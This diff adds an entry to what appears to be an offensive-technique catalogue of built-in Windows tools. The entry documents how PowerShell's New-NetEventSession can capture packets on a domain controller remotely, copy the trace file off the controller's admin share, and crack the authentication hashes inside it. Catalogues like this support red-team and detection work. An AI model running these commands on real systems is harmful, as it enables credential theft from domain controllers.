@@ -1,0 +1,33 @@
+---
+Name: New-NetEventSession
+Description: Creates a network event session
+Updated: 2023-07-01
+Toolsets:
+  - Builtin
+  - CIMSession
+Commands:
+  - Command: |
+      New-NetEventSession -Name sess -CimSession $s -LocalFilePath "C:\Windows\Temp\Trace.etl" -CaptureMode SaveToFile
+      Add-NetEventPacketCaptureProvider -SessionName sess -CimSession $s -Level 4 -CaptureType Physical
+      Start-NetEventSession -Name sess -CimSession $s
+      Get-NetEventSession -Name sess -CimSession $s
+      
+      Stop-NetEventSession -Name sess -CimSession $s
+      Remove-NetEventSession -Name sess -CimSession $s
+      Move-Item \\DC1.ad.bitsadmin.com\C$\Windows\Temp\Trace.etl C:\tmp
+    Description: Sniff traffic
+    Usecases:
+      - Sniff authentication traffic on a domain controller and locally crack the hashes
+    Function: Network
+    Comments:
+      - 'Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)'
+      - 'Convert resulting `.etl` file to `.pcapng` using `etl2pcapng`'
+      - 'PowerShell Module: `NetEventPacketCapture`'
+    MitreAttack:
+      - T1047
+Resources:
+  - https://github.com/microsoft/etl2pcapng
+Detections:
+Contributors:
+    - Name: Arris Huijgen
+      Handle: bitsadmin
